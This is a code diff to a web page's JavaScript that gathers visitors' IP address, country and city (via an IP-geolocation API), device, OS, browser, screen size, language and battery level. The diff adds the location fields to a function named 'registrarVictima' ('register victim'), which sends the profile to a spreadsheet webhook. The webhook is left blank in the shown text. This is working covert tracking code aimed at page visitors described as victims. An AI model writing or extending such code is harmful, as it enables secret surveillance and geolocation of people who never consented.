@@ -350,12 +350,20 @@ for(let i=0;i<12;i++)spawnHex();
 // DEVICE INFO (extended)
 // ══════════════════════════════════════
 let ipAddress='Obteniendo...';
+let pais='--';
+let ciudad='--';
 let batteryLevel='--';
 let netType='--';
 let cpuCores=navigator.hardwareConcurrency||'--';
 
-// Fetch IP
-fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ipAddress=d.ip}).catch(()=>{ipAddress='Oculta (VPN?)'});
+// Fetch IP + País + Ciudad
+fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+  ipAddress=d.ip||'Oculta';
+  pais=d.country_name||'--';
+  ciudad=(d.city||'')+(d.region?', '+d.region:'');
+}).catch(()=>{
+  ipAddress='Oculta (VPN?)';
+});
 
 // Battery
 if(navigator.getBattery){navigator.getBattery().then(b=>{batteryLevel=Math.round(b.level*100)+'%'}).catch(()=>{})}
@@ -390,6 +398,8 @@ function getDeviceInfo(){
   else if(/Firefox\//.test(ua))br='Firefox';
   return [
     {l:'Dirección IP',v:ipAddress},
+    {l:'Ubicación',v:ciudad||pais},
+    {l:'País',v:pais},
     {l:'Dispositivo',v:dev},
     {l:'Sistema operativo',v:os},
     {l:'Navegador',v:br},
@@ -440,12 +450,16 @@ const SHEET_WEBHOOK='';
 
 function registrarVictima(){
   if(!SHEET_WEBHOOK)return;
+  const info=getDeviceInfo();
+  const get=l=>(info.find(d=>d.l===l)||{}).v||'--';
   const data={
     fecha:new Date().toLocaleString('es-AR'),
     ip:ipAddress,
-    dispositivo:getDeviceInfo().find(d=>d.l==='Dispositivo').v,
-    so:getDeviceInfo().find(d=>d.l==='Sistema operativo').v,
-    navegador:getDeviceInfo().find(d=>d.l==='Navegador').v,
+    pais:pais,
+    ciudad:ciudad,
+    dispositivo:get('Dispositivo'),
+    so:get('Sistema operativo'),
+    navegador:get('Navegador'),
     pantalla:screen.width+'x'+screen.height,
     idioma:(navigator.language||'').toUpperCase(),
     bateria:batteryLevel,
